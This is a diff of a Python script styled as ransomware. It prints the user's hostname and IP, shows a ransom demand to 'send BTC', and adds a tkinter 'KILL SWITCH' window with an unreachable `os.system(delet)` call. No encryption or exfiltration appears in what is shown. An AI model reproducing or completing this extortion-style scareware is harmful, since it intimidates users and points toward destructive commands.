@@ -408,29 +408,67 @@ print("""
 ''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
 """)
 print("\\")
-print("|| Your OS: " + hostname)
-print("|| Your IP: " + IPAddr)
+print("|| OS: " + hostname)
+print("|| IP: " + IPAddr)
 print("//")
-print(" ")
-print(" ")
 print(" ")
 print("\\")
 print("|| TIME")
 print("|| ::::::::::::::::::::::::::::::::::::::")
-print("|| You have around 10 minutes to send BTC")
-print("|| To The Owner,")
+print("|| You have around 40 years to send BTC")
 print("|| ::::::::::::::::::::::::::::::::::::::")
 print("//")
 print(" ")
-print(" ")
-print(" ")
 print("\\")
-print("||")
 print("|| L0ADING...")
-print("||")
 print("//")
+
+
+
+
+
+
+
+
+from tkinter import *
+from tkinter import simpledialog
+def get_me2():
+    s = simpledialog.askfloat("KILL SWITCH", "Type 1 then press OK")
+    print(" ")
+    print(" ")
+    print(s)
+    print("KILLING RANSOMEWARE")
+    time.sleep(2)
+    sys.exit("DONE!")
+    os.system(delet)
+time.sleep(2)
+def get_me3():
+    s = simpledialog.askfloat("CLOSE", "Type any number than press ok to close me")
+    print(" ")
+    print(" ")
+    print("Process ended...")
+    print("It is recommended that you keep this open for safety")
+  
+
+root = Tk()
+
+
+button = Button(root, text="--> KILL SWITCH <--", command=get_me2)
+button.pack()
+button = Button(root, text="--> CLOSE ME <--", command=get_me3)
+button.pack()
+
+root.geometry("250x250")
+
+
+
+
+
+
+
+
 time.sleep(10)
-print("Would you like to start???")
+print("START?")
 print("YES OR NO???")
 choice = input("")
 
@@ -597,7 +635,12 @@ if choice == "no":
             gpu_id, gpu_name, gpu_load, gpu_free_memory, gpu_used_memory,
             gpu_total_memory, gpu_temperature, gpu_uuid
         ))
-
+    print("NOT FOUND")
+    print(" ")
+    print(" ")
+    print(" ")
+    print(" ")
+    print(" ")
     print("Let me ask again")
     print("are you ready to start????")
 choice = input("")
